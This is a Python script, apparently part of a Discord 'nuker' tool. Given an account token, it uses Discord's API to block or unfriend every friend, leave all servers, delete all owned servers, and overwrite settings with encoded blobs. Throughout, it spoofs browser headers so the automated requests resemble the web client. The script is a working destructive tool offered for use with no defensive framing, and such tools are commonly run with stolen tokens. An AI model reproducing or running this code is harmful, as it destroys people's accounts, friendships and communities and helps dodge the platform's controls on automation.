
import requests

desc = "Nukes your Discord account."
params = {
    "token" : "your Discord authentication token",
    "remove_friends" : "if you want to remove all your friends (Y/n)",
    "block_friends" : "if you want to block all your friends (Y/n)",
    "leave_servers" : "if you want to leave all servers (Y/n)",
    "delete_servers" : "if you want to delete all your servers (Y/n)",
    "settings_troll" : "if you want to nuke your settings (y/N)",
}

def run(token, remove_friends="Y", block_friends="Y", leave_servers="Y", delete_servers="Y", settings_troll="N"):
    headers = { "accept" : "*/*", "accept-encoding" : "gzip, deflate", "accept-language" : "en-US", "authorization" : token, "dnt" : "1", "referer" : "https://discord.com/channels/@me", "sec-ch-ua-mobile" : "?0", "sec-ch-ua-platform" : "\"Windows\"", "sec-fetch-dest" : "empty", "sec-fetch-mode" : "cors", "sec-fetch-site" : "same-origin", "user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "x-debug-options" : "bugReporterEnabled", "x-discord-locale" : "en-US" }
    remove_friends = True if remove_friends.lower() == "y" else False
    block_friends = True if block_friends.lower() == "y" else False
    leave_servers = True if leave_servers.lower() == "y" else False
    delete_servers = True if delete_servers.lower() == "y" else False
    settings_troll = False if settings_troll.lower() == "n" else True
    if remove_friends or block_friends:
        friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        for friend in friends.json():
            id = friend['id']
            if block_friends:
                requests.put(f'https://discord.com/api/v9/users/@me/relationships/{id}', json={'type': 2}, headers=headers)
            elif remove_friends:
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers=headers)
    if leave_servers or delete_servers:
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
        user_settings = requests.get('https://discord.com/api/v9/users/@me/settings', headers=headers)
        whitelisted = []
        for guild in guilds.json():
            id = guild['id']
            if leave_servers and guild['owner'] == False:
                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', json={'lurking': 'false'}, headers=headers)
            elif delete_servers and guild['owner'] == True:
                requests.post(f'https://discord.com/api/v9/guilds/{id}/delete', headers=headers)
    if settings_troll:
        settings_url = 'https://discord.com/api/v9/users/@me/settings-proto/1'
        # this isn't obfuscated btw, discord just has encrypted settings, it basically changes the language, light mode, and a few other things i forgor
        settings_lol = {'CgIYGCILCgkQAAAAAAAAACAyBYoBAggBYg4KBwoFZW4tVVMSAwjwAWoECAEQAXInChkKEApQxMc1H1AOZDBCKwjhYQ0SBQjvmJEuCgoKCFJQxIabOkgO', 'CgIYGiILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgVlbi1VUxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=', 'CgIYGyILCgkQAAAAAAAAACAyCoIBAggBigECCAFiDgoHCgV6aC1UVxIDCPABagQIARABcicKGQoQClDExzUfUA5kMEIrCOFhDRIFCO+YkS4KCgoIUlDEhps6SA4=', 'Yg4KBwoFemgtVFcSAwjwAWoECAIQAQ==', 'agQIAhAB'}
        for setting in settings_lol:
            requests.patch(settings_url, headers=headers, json={ "settings" : setting })

if __name__ == "__main__":
    config = {}
    for param in params:
        config[param] = input("Enter "+params[param]+": ")
    run(**config)
